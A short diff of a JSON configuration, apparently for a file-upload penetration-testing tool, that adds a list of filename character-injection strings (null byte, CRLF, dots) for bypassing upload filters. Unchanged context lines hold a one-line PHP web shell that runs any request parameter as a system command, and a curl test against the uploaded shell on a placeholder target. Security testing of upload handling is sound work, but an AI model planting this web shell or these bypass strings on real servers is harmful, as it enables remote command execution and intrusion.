@@ -4,6 +4,7 @@
     "SCRIPT":"<?php system($_REQUEST['cmd']); ?>",
     "WEBSHELL_COMMAND":"whoami",
     "CURL_FILE":"post_curl.txt",
+	"CHARACTER_INJECTION_CHARACTERS":["%20","%0a","%00","%0d0a","/",".\\",".","…",":"],
     "WEBSHELL_TEST":[
 		"curl",
 		"http://TARGET/files/shellEXTENSION?cmd=WEBSHELL_COMMAND"
